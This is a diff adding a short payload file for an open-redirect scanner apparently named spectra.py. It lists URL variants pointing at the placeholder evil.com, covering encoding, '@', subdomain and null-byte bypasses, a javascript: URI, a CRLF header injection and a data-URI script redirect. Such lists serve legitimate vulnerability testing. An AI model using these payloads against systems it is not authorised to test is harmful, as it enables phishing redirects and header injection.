@@ -1,0 +1,54 @@
+# Open Redirect Payloads - Versão Focada
+# Arquivo com payloads mais direcionados para testes rápidos
+# Uso: python spectra.py open-redirect-scan -u "http://target.com" --payload-file redirect_payloads_focused.txt --fast
+
+# === TOP 20 PAYLOADS MAIS EFICAZES ===
+
+# Básicos mais comuns
+http://evil.com
+https://evil.com
+//evil.com
+
+# IP addresses
+http://127.0.0.1
+http://192.168.1.100
+
+# Encoding básico
+%2F%2Fevil.com
+http%3A%2F%2Fevil.com
+
+# Bypass com @
+http://evil.com@target.com
+
+# JavaScript
+javascript:alert('redirect')
+
+# Fragment bypass
+http://target.com#http://evil.com
+
+# Path bypass
+http://target.com/../evil.com
+
+# Subdomain bypass
+http://target.com.evil.com
+
+# Whitespace
+%20http://evil.com
+
+# CRLF injection
+http://target.com%0d%0aLocation:%20http://evil.com
+
+# Case variation
+HTTP://EVIL.COM
+
+# Data URI
+data:text/html,<script>location='http://evil.com'</script>
+
+# Backslash (Windows)
+http:\\\\evil.com
+
+# Null byte
+http://evil.com%00
+
+# Double slash
+///evil.com
